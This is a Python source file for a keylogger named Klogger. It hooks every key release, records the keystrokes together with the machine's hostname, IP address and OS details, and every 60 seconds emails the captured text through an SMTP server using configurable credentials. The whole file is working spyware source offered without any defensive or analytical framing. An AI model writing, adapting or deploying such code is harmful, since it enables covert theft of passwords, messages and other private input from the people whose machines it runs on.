import logging
import smtplib
import socket
import threading
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import keyboard
import os

EMAIL_ADDRESS = "YOUR_USERNAME"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SEND_REPORT_EVERY = 60  # seconds

class Klogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = ""
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.start_logger()

    def append_to_log(self, string):
        self.log += string

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # Not a character, e.g. shift, ctrl, alt, etc.
            # Uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.append_to_log(name)

    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'Logger Report'

        msg.attach(MIMEText(message, 'plain'))

        try:
            server = smtplib.SMTP('smtp.mailtrap.io', 2525)
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        self.send_mail(self.email, self.password, self.system_info + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def get_system_info(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system_info = platform.uname()
        return (f"Hostname: {hostname}\n"
                f"IP Address: {ip_address}\n"
                f"System: {system_info.system}\n"
                f"Node Name: {system_info.node}\n"
                f"Release: {system_info.release}\n"
                f"Version: {system_info.version}\n"
                f"Machine: {system_info.machine}\n"
                f"Processor: {system_info.processor}\n")

    def start_logger(self):
        self.report()
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

if __name__ == "__main__":
    logger = Klogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)